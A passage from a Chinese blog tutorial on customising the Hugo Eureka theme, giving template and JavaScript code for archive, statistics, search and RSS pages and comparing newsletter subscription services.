也就是这里：\n使用obsidian模板自动生成文章头部 需要下载插件Templater，请阅读其官方文档中模板的写法（网上有些博客的教程是旧版的，现在已经不能用了）\n示例如下：\n使用时按Alt+E就行\n需要注意的是，为了避免hugo解析content文件夹中存放模板的model文件夹（模板文件夹必须存放在obsidian仓库内），我们需要在comfig.yaml中指定ignore的pattern：\n具体详见Configure Hugo |Hugo\n增强内容 下面会用到的外部js代码请下载此附件\n下载解压后放在/static/js中\n增加归档页 请务必下载外部js代码！\n在/themes/eureka/layouts/_default/文件夹下新建archive.html，并填入：\n{{/* layouts/_default/archive.html */}} {{ define \u0026#34;main\u0026#34; }} {{ $hasToc := and (in .TableOfContents \u0026#34;\u0026lt;li\u0026gt;\u0026#34; ) (.Params.toc) }} {{ $hasSidebar := or ($hasToc) (.Params.series) }} \u0026lt;div class=\u0026#34;grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-span-2 {{ if not $hasSidebar }} {{- print \u0026#34; lg:col-start-2\u0026#34; -}} {{ end }} lg:col-span-6 bg-secondary-bg rounded px-6 py-8\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; --\u0026gt; \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;归档\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ $featured := partial \u0026#34;utils/get-featured.html\u0026#34; . }} {{ with $featured }} \u0026lt;div class=\u0026#34;my-4\u0026#34;\u0026gt; {{ . }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;script type=\u0026#39;text/javascript\u0026#39; src=\u0026#34;{{.Site.BaseURL}}js/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .car-collapse .car-yearmonth { cursor: s-resize; } \u0026lt;/style\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; /* \u0026lt;![CDATA[ */ jQuery(document).ready(function () { jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).hide(); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-monthlisting:first\u0026#39;).show(); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-yearmonth\u0026#39;).click(function () { jQuery(this).next(\u0026#39;ul\u0026#39;).slideToggle(\u0026#39;fast\u0026#39;); }); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-toggler\u0026#39;).click(function () { if (\u0026#39;展开全部\u0026#39; == jQuery(this).text()) { jQuery(this).parent(\u0026#39;.car-container\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).show(); jQuery(this).text(\u0026#39;折叠全部\u0026#39;); } else { jQuery(this).parent(\u0026#39;.car-container\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).hide(); jQuery(this).text(\u0026#39;展开全部\u0026#39;); } return false; }); }); /* ]]\u0026gt; */ \u0026lt;/script\u0026gt; \u0026lt;div class=\u0026#34;car-container car-collapse\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;car-toggler\u0026#34; style=\u0026#34;color: darkgray;\u0026#34;\u0026gt;展开全部\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026#34;car-list\u0026#34;\u0026gt; {{ range (.Site.RegularPages.GroupByDate \u0026#34;2006年 01月\u0026#34;) }} \u0026lt;li\u0026gt; \u0026lt;span class=\u0026#34;car-yearmonth\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color: rgba(255, 105, 105, 0.737);font-weight: bold;\u0026#34;\u0026gt;{{ .Key }}\u0026lt;/span\u0026gt; \u0026lt;span title=\u0026#34;Post Count\u0026#34;\u0026gt; 共{{ len .Pages }}篇\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;ul class=\u0026#34;car-monthlisting\u0026#34; style=\u0026#34;display: block;\u0026#34;\u0026gt; {{ range .Pages }} \u0026lt;li style=\u0026#34;text-indent:2em;\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;color: rgb(100, 100, 100);\u0026#34;\u0026gt;{{ .Date.Format \u0026#34;02日\u0026#34;}} \u0026lt;/span\u0026gt;\u0026lt;b\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; style=\u0026#34;margin-left: 1em;\u0026#34;\u0026gt;{{ .Title }} \u0026lt;/a\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;!-- \u0026lt;span title=\u0026#34;Comment Count\u0026#34;\u0026gt;(0)\u0026lt;/span\u0026gt; --\u0026gt; \u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} 然后新建content/archive/archive.md并填入frontmatter：\n--- layout: archive title: \u0026#34;归档\u0026#34; date: 2022-12-29T3:01:44+08:00 draft: false --- 最后在menu.yaml加上对它的索引就好了：\n来源见Hugo 主题 Eureka 自定义 | 怡红院落\n增加统计页 请务必下载外部js代码！\n在/themes/eureka/layouts/_default/文件夹下新建stats.html，并填入：\n{{/* layouts/_default/stats.html */}} {{ define \u0026#34;main\u0026#34; }} {{- $.Scratch.Add \u0026#34;stats\u0026#34; slice -}} {{- range .Site.RegularPages -}} {{- $.Scratch.Add \u0026#34;stats\u0026#34; (dict \u0026#34;title\u0026#34; .Title \u0026#34;slug\u0026#34; .Slug \u0026#34;year\u0026#34; (.Date.Format \u0026#34;2006\u0026#34;) \u0026#34;month\u0026#34; (.Date.Format \u0026#34;2006-01\u0026#34;) \u0026#34;hour\u0026#34; (.Date.Format \u0026#34;15\u0026#34;) \u0026#34;week\u0026#34; (.Date.Format \u0026#34;Monday\u0026#34;) \u0026#34;count\u0026#34; .WordCount) -}} {{- end -}} {{ $hasToc := and (in .TableOfContents \u0026#34;\u0026lt;li\u0026gt;\u0026#34; ) (.Params.toc) }} {{ $hasSidebar := or ($hasToc) (.Params.series) }} \u0026lt;style\u0026gt; .chart { margin-top: 15px; width: 100%; height: 350px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-span-2 {{ if not $hasSidebar }} {{- print \u0026#34;lg:col-start-2\u0026#34; -}} {{ end }} lg:col-span-6 bg-secondary-bg rounded px-6 py-8\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; --\u0026gt; \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;统计\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ $featured := partial \u0026#34;utils/get-featured\u0026#34; . }} {{ with $featured }} \u0026lt;div class=\u0026#34;my-4\u0026#34;\u0026gt; {{ . }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;basic-info\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa-solid fa-spinner\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;加载中...\u0026lt;/p\u0026gt; \u0026lt;h2 id=\u0026#34;文章数统计\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;year-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;month-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;h2 id=\u0026#34;时间段统计\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;hour-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;weekday-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if $hasSidebar}} \u0026lt;div class=\u0026#34;col-span-2\u0026#34;\u0026gt; {{ if .GetTerms \u0026#34;series\u0026#34; }} {{ partial \u0026#34;components/post-series.html\u0026#34; . }} {{ end }} {{ if $hasToc }} {{ partial \u0026#34;components/post-toc.html\u0026#34; . }} {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/echarts.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const data = {{- $.Scratch.Get \u0026#34;stats\u0026#34; -}}; function showChart(id, title, type, d) { var chart = echarts.init(document.getElementById(id)); var xData = []; var yData = []; d.forEach(function(item) { xData.push(item[0]); yData.push(item[1]); }); var option = { title : { text : title }, tooltip : { trigger : \u0026#39;axis\u0026#39; }, xAxis : [ { type : \u0026#39;category\u0026#39;, data : xData } ], yAxis : [ { type : \u0026#39;value\u0026#39; } ], grid : { x : 35, y : 45, x2 : 35, y2 : 35 }, series : [ { type : \u0026#39;bar\u0026#39;, name : type, data : yData, markLine : { data : [ { type : \u0026#39;average\u0026#39;, name : \u0026#39;平均值\u0026#39; }], itemStyle : { normal : { color : \u0026#39;#4087bd\u0026#39; } } }, itemStyle : { normal : { color : \u0026#39;#87cefa\u0026#39; } } }] }; chart.setOption(option); } window.addEventListener(\u0026#39;load\u0026#39;, function() { basicInfo(); yearStats(); monthStats(); hourStats(); weekStats(); }); function basicInfo() { const articles = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;posts\u0026#34;) }}; const writeup = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;writeup\u0026#34;) }}; const principle = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;principle\u0026#34;) }}; const tricks = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;tricks\u0026#34;) }}; const pages = articles + writeup + principle + tricks; //const comments = data.reduce((count, article) =\u0026gt; count + article.comments, 0); const words = data.reduce((count, article) =\u0026gt; count + article.count, 0); document.querySelector(\u0026#39;#basic-info\u0026#39;).innerHTML = ` \u0026lt;span\u0026gt;总文章数：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;${pages}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;Posts：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/posts/\u0026#34;\u0026gt;${articles}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;WriteUps：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/writeup/\u0026#34;\u0026gt;${writeup}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;Tricks：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/tricks/\u0026#34;\u0026gt;${tricks}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;Principle：\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/principle/\u0026#34;\u0026gt;${principle}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; 篇\u0026lt;/span\u0026gt;； \u0026lt;span\u0026gt;总字数：\u0026lt;strong\u0026gt;${words}\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;； `; }; function yearStats() { const yearGroup = {}; data.forEach(article =\u0026gt; { const year = parseInt(article.year); if(!yearGroup.hasOwnProperty(year)) { yearGroup[year] = 0; } yearGroup[year] += 1; }); const d = []; for(let i = 2022; i \u0026lt;= (new Date().getFullYear()); i++) { d.push([i, yearGroup[i] || 0]); } showChart(\u0026#39;year-stat\u0026#39;, \u0026#39;文章数 - 按年统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } function monthStats() { const monthGroup = {}; data.forEach(article =\u0026gt; { if(!monthGroup.hasOwnProperty(article.month)) { monthGroup[article.month] = 0; } monthGroup[article.month] += 1; }); const d = []; for(let year = 2022; year \u0026lt;= (new Date().getFullYear()); year++) { for(let month = 1; month \u0026lt; 13; month++) { const text = `${year}-${month \u0026lt; 10 ? \u0026#39;0\u0026#39; + month : month}`; d.push([text, monthGroup[text] || 0]); } } showChart(\u0026#39;month-stat\u0026#39;, \u0026#39;文章数 - 按月统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } function hourStats() { const hourGroup = {}; data.forEach(article =\u0026gt; { const hour = parseInt(article.hour); if(!hourGroup.hasOwnProperty(hour)) { hourGroup[hour] = 0; } hourGroup[hour] += 1; }); const d = [ [\u0026#39;00:00-01:00\u0026#39;], [\u0026#39;01:00-02:00\u0026#39;], [\u0026#39;02:00-03:00\u0026#39;], [\u0026#39;03:00-04:00\u0026#39;], [\u0026#39;04:00-05:00\u0026#39;], [\u0026#39;05:00-06:00\u0026#39;], [\u0026#39;06:00-07:00\u0026#39;], [\u0026#39;07:00-08:00\u0026#39;], [\u0026#39;08:00-09:00\u0026#39;], [\u0026#39;09:00-10:00\u0026#39;], [\u0026#39;10:00-11:00\u0026#39;], [\u0026#39;11:00-12:00\u0026#39;], [\u0026#39;12:00-13:00\u0026#39;], [\u0026#39;13:00-14:00\u0026#39;], [\u0026#39;14:00-15:00\u0026#39;], [\u0026#39;15:00-16:00\u0026#39;], [\u0026#39;16:00-17:00\u0026#39;], [\u0026#39;17:00-18:00\u0026#39;], [\u0026#39;18:00-19:00\u0026#39;], [\u0026#39;19:00-20:00\u0026#39;], [\u0026#39;20:00-21:00\u0026#39;], [\u0026#39;21:00-22:00\u0026#39;], [\u0026#39;22:00-23:00\u0026#39;], [\u0026#39;23:00-24:00\u0026#39;] ].map((item, key) =\u0026gt; { item[1] = hourGroup[key] || 0; return item; }); showChart(\u0026#39;hour-stat\u0026#39;, \u0026#39;文章数 - 按时段统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } function weekStats() { const weekGroup = {}; data.forEach(article =\u0026gt; { if(!weekGroup.hasOwnProperty(article.week)) { weekGroup[article.week] = 0; } weekGroup[article.week] += 1; }); const d = [ [\u0026#39;星期一\u0026#39;, weekGroup.Monday], [\u0026#39;星期二\u0026#39;, weekGroup.Tuesday], [\u0026#39;星期三\u0026#39;, weekGroup.Wednesday], [\u0026#39;星期四\u0026#39;, weekGroup.Thursday], [\u0026#39;星期五\u0026#39;, weekGroup.Friday], [\u0026#39;星期六\u0026#39;, weekGroup.Saturday], [\u0026#39;星期日\u0026#39;, weekGroup.Sunday] ]; showChart(\u0026#39;weekday-stat\u0026#39;, \u0026#39;文章数 - 按星期几统计\u0026#39;, \u0026#39;文章数\u0026#39;, d); } \u0026lt;/script\u0026gt; {{ end }} 其中函数basicInfo可自定义显示的模块信息\n然后新建content/stats/stats.md并填入frontmatter：\n--- layout: stats title: \u0026#34;统计\u0026#34; date: 2022-12-29T3:01:44+08:00 draft: false slug: \u0026#34;stats\u0026#34; --- 来源：Hugo 主题 Eureka 自定义 | 怡红院落\n增加搜索功能 请务必下载外部js代码！\n在config.yaml中加上：\noutputs: home: - \u0026#34;HTML\u0026#34; - \u0026#34;RSS\u0026#34; - \u0026#34;JSON\u0026#34; 然后新建themes/eureka/layouts/index.json填入：\n{{- $.Scratch.Add \u0026#34;index\u0026#34; slice -}} {{- range .Site.RegularPages -}} {{- $.Scratch.Add \u0026#34;index\u0026#34; (dict \u0026#34;title\u0026#34; .Title \u0026#34;tags\u0026#34; .Params.tags \u0026#34;categories\u0026#34; .Params.categories \u0026#34;contents\u0026#34; .Plain \u0026#34;summary\u0026#34; .Summary \u0026#34;permalink\u0026#34; .Permalink \u0026#34;date\u0026#34; (.Date.Format \u0026#34;2006年01月02日\u0026#34;) \u0026#34;section\u0026#34; .Section) -}} {{- end -}} {{- $.Scratch.Get \u0026#34;index\u0026#34; | jsonify -}} 参见Hugo 之旅 | 怡红院落\n在themes/eureka/layouts/partials/header.html中找到有很多个div元素并列的地方，并加上：\n\u0026lt;div class=\u0026#34;flex\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;search-container relative pt-4 md:pt-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;form role=\u0026#34;search\u0026#34; class=\u0026#34;search-form\u0026#34; action=\u0026#34;/search.html\u0026#34; method=\u0026#34;get\u0026#34;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input name=\u0026#34;q\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;搜索 ...\u0026#34; class=\u0026#34;search-field\u0026#34;\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-magnifying-glass\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 然后在文件最上面加上：\n\u0026lt;style\u0026gt; .search-container { margin-top: -0.3rem; margin-right: 1rem; } .search-container .search { border: 1px solid #e2e8f0; border-radius: 4px; } .search-container input { padding-left: 1rem; line-height: 2rem; outline: none; background: transparent; } .search-container button { font-size: 0.8rem; margin-right: 0.5rem; color: #e2e8f0; } \u0026lt;/style\u0026gt; 然后新建themes/eureka/layouts/_default/search.html，内容如下：\n{{/* layouts/_default/search.html */}} {{ define \u0026#34;main\u0026#34; }} \u0026lt;div class=\u0026#34;w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto\u0026#34;\u0026gt; \u0026lt;article class=\u0026#34;mx-6 my-8\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;search-count\u0026#34; class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;div id=\u0026#34;search-result\u0026#34; class=\u0026#34;bg-secondary-bg rounded overflow-hidden px-4 divide-y\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/fuse.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; --\u0026gt; \u0026lt;script\u0026gt; document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, async () =\u0026gt; { const qs = new URLSearchParams(location.search); const searchResult = document.querySelector(\u0026#39;#search-result\u0026#39;); const searchCount = document.querySelector(\u0026#39;#search-count\u0026#39;); const fuseOptions = { shouldSort: true, includeMatches: true, threshold: 0.6, tokenize: true, location: 0, distance: 100, maxPatternLength: 32, minMatchCharLength: 1, findAllMatches: true, useExtendedSearch: true, keys: [{ name: \u0026#34;title\u0026#34;, weight: 0.8 }, { name: \u0026#34;summary\u0026#34;, weight: 0.2 }, { name: \u0026#34;tags\u0026#34;, weight: 0.6 }, { name: \u0026#34;catagories\u0026#34;, weight: 0.2 }, { name: \u0026#34;date\u0026#34;, weight: 0.3 }, ] }; let fuse = null async function getFuse() { if (fuse == null) { const resp = await fetch(\u0026#39;/index.json\u0026#39;, { method: \u0026#39;get\u0026#39; }) const indexData = await resp.json() fuse = new Fuse(indexData, fuseOptions); } return fuse } function render(items) { console.log(items); return items.map(item =\u0026gt; { item = item.item return ` \u0026lt;div class=\u0026#34;px-2 py-6\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col-reverse lg:flex-row justify-between\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full lg:w-2/3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;my-2\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mb-4\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}\u0026#34; class=\u0026#34;font-bold text-xl hover:text-eureka\u0026#34;\u0026gt;${item.title}\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; ${item.summary} \u0026lt;p class=\u0026#34;more\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}\u0026#34; title=\u0026#34;${item.title}\u0026#34;\u0026gt;阅读全文\u0026lt;span class=\u0026#34;meta-nav\u0026#34;\u0026gt;→\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.date}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}#waline-comments\u0026#34; title=\u0026#34;${item.title}\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-comment mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.comments \u0026gt; 0 ? item.comments + \u0026#39; 条评论\u0026#39; : \u0026#39;暂无评论\u0026#39;}\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-folder-open\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.categories}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-tags\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;\u0026lt;b\u0026gt;${item.tags}\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;w-full lg:w-1/3 mb-4 lg:mb-0 lg:ml-8\u0026#34;\u0026gt; ${item.featuredImage ? `\u0026lt;img src=\u0026#34;${item.featuredImage}\u0026#34; class=\u0026#34;w-full\u0026#34; alt=\u0026#34;Featured Image\u0026#34;\u0026gt;` : \u0026#39;\u0026#39;} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;`; }).join(\u0026#39;\u0026#39;); } function updateDOM(html, keyword, number) { document.title = document.title.replace(/包含关键词.*?文章/, `包含关键词 ${keyword} 的文章`) searchResult.innerHTML = html searchCount.innerHTML = `共查询到 ${number} 篇文章` } async function search(searchString) { console.log(searchString); let result = []; if(searchString) { const fuse = await getFuse() result = fuse.search(searchString) } const html = render(result) updateDOM(html, searchString, result.length) } document.querySelectorAll(\u0026#39;input[name=\u0026#34;q\u0026#34;]\u0026#39;).forEach(el =\u0026gt; el.value = qs.get(\u0026#39;q\u0026#39;)); search(qs.get(\u0026#39;q\u0026#39;) || \u0026#39;\u0026#39;) window.blogSearch = function(keyword) { if(!keyword) { return; } history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, location.pathname + \u0026#39;?q=\u0026#39; + encodeURIComponent(keyword)); document.querySelectorAll(\u0026#39;input[name=\u0026#34;q\u0026#34;]\u0026#39;).forEach(el =\u0026gt; el.value = keyword); search(keyword); } }) \u0026lt;/script\u0026gt; {{ end }} 然后新建content/search.md填入：\n--- title: \u0026#34;搜索结果\u0026#34; sitemap: priority : 0.1 layout: \u0026#34;search\u0026#34; date: \u0026#34;2022-12-29T05:02:20+08:00\u0026#34; slug: \u0026#34;search.html\u0026#34; --- 来源：Hugo 主题 Eureka 自定义 | 怡红院落\n自定义RSS文件 请务必下载外部js代码！\n新建themes/eureka/layouts/_default/rss.xml，然后可以填入go模板，下面是一个示例：\n{{- $page_context := cond .IsHome site . -}} {{- $pages := $page_context.RegularPages -}} {{- $limit := site.Config.Services.RSS.Limit -}} {{- if ge $limit 1 -}} {{- $pages = $pages | first $limit -}} {{- end -}} {{- printf \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;utf-8\\\u0026#34; standalone=\\\u0026#34;yes\\\u0026#34; ?\u0026gt;\u0026#34; | safeHTML }} \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;{{ if ne .Title site.Title }}{{ with .Title }}{{.}} | {{ end }}{{end}}{{ site.Title }}\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;{{ .Permalink }}\u0026lt;/link\u0026gt; {{- with .OutputFormats.Get \u0026#34;RSS\u0026#34; }} {{ printf \u0026#34;\u0026lt;atom:link href=%q rel=\\\u0026#34;self\\\u0026#34; type=%q /\u0026gt;\u0026#34; .Permalink .MediaType | safeHTML }} {{ end -}} \u0026lt;description\u0026gt;{{ .Title | default site.Title }}\u0026lt;/description\u0026gt; \u0026lt;generator\u0026gt;Hugo -- gohugo.io AND \u0026lt;a href=\u0026#34;https://github.com/wangchucheng/hugo-eureka/\u0026#34;\u0026gt;Eureka\u0026lt;/a\u0026gt;\u0026lt;/generator\u0026gt; {{- with site.LanguageCode }}\u0026lt;language\u0026gt;{{.}}\u0026lt;/language\u0026gt;{{end -}} {{- with site.Copyright }}\u0026lt;copyright\u0026gt;{{ replace (replace . \u0026#34;{year}\u0026#34; now.Year) \u0026#34;\u0026amp;copy;\u0026#34; \u0026#34;©\u0026#34; | plainify }}\u0026lt;/copyright\u0026gt;{{end -}} {{- if not .Date.IsZero }}\u0026lt;lastBuildDate\u0026gt;{{ .Date.Format \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; | safeHTML }}\u0026lt;/lastBuildDate\u0026gt;{{ end -}} {{ range $pages }} \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;{{ .Permalink }}\u0026lt;/link\u0026gt; \u0026lt;pubDate\u0026gt;{{ .Date.Format \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; | safeHTML }}\u0026lt;/pubDate\u0026gt; \u0026lt;guid\u0026gt;{{ .Permalink }}\u0026lt;/guid\u0026gt; {{ with .Description }} \u0026lt;description\u0026gt;{{ . }}\u0026lt;/description\u0026gt; {{ else }} {{if .IsPage}} \u0026lt;description\u0026gt;{{ .Summary }}\u0026lt;/description\u0026gt; {{ else }} {{ with .Site.Params.Description }} \u0026lt;description\u0026gt;{{ . }}\u0026lt;/description\u0026gt; {{ end }} {{ end }} {{ end }} \u0026lt;/item\u0026gt; {{ end }} \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; 增加订阅功能 请务必下载外部js代码！\n首先，此功能要求网站有一个RSS文件，一般会自动生成为index.xml\n法一：TinyLetter+Zapier 使用TinyLetter的获取订阅者服务+Zapier的自动发信服务，具体步骤详见Newsletter for Hugo Blog - Backendology - A study of backend web development by Jared Ririe\n法二：使用follow.it 我们还可以使用更自动化、更便捷的follow.it | Feedburner Alternative - Get more readers，有免费计划也有付费计划，付费计划价格也较低\n直接根据官网的指引走就好了，然后它就会自动解析你的RSS页面中最近发表的文章，前提是你要有RSS。\nfollow.it分两种发信方式，一种是NewsPaper，在每天的固定时间向订阅者推送消息或邮件；另一种是single 